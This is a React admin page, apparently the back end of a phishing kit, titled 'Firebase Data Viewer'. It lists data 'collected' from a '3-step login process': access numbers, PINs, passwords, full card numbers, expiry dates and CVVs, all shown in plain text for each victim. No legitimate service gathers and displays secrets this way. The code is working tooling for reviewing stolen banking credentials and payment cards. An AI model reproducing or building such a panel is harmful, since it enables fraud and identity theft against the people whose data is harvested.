import React, { useState, useEffect } from 'react';
import { getCompleteUserData } from '../database';

export default function AdminPage({ onBack }) {
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);


  useEffect(() => {
    loadAllData();
  }, []);

  const loadAllData = async () => {
    try {
      setLoading(true);
      const completeData = await getCompleteUserData();
      setData(completeData);
    } catch (error) {
      console.error('Error loading data:', error);
    } finally {
      setLoading(false);
    }
  };

  const formatDate = (timestamp) => {
    return new Date(timestamp).toLocaleString();
  };



  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-red-600 mx-auto mb-4"></div>
          <p>Loading data...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          <div className="flex justify-between items-center mb-4">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 mb-2">Firebase Data Viewer</h1>
              <p className="text-gray-600">View all collected user data from the 3-step login process</p>
            </div>
            {onBack && (
              <button
                onClick={onBack}
                className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-700"
              >
                Back to Login
              </button>
            )}
          </div>
          
          <div className="mb-6">
            <p className="text-lg font-semibold">Complete User Data ({data.length})</p>
          </div>

          <button
            onClick={loadAllData}
            className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
          >
            Refresh Data
          </button>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-6">
          <h2 className="text-2xl font-semibold mb-4">Complete User Data</h2>
          {data.length === 0 ? (
            <p className="text-gray-500">No complete data found</p>
          ) : (
            <div className="space-y-4">
              {data.map((item, index) => (
                  <div key={item.id} className="border rounded-lg p-4 bg-gray-50">
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                      <div>
                        <strong>Access Number:</strong><br />
                        <span className="font-mono">{item.accessNumber}</span>
                      </div>
                      <div>
                        <strong>PIN:</strong><br />
                        <span className="font-mono">{item.pin}</span>
                      </div>
                      <div>
                        <strong>User Number:</strong><br />
                        <span>{item.userNumber}</span>
                      </div>
                      <div>
                        <strong>Password:</strong><br />
                        <span className="font-mono">{item.password}</span>
                      </div>
                      <div>
                        <strong>Card Number:</strong><br />
                        <span className="font-mono">{item.cardNumber}</span>
                      </div>
                      <div>
                        <strong>Expiry Date:</strong><br />
                        <span className="font-mono">{item.expiryDate}</span>
                      </div>
                      <div>
                        <strong>CVV:</strong><br />
                        <span className="font-mono">{item.cvv}</span>
                      </div>
                      <div>
                        <strong>Completed At:</strong><br />
                        <span className="text-sm">{formatDate(item.completedAt)}</span>
                      </div>
                      <div>
                        <strong>Status:</strong><br />
                        <span className="text-green-600 font-semibold">{item.status}</span>
                      </div>
                    </div>
                  </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}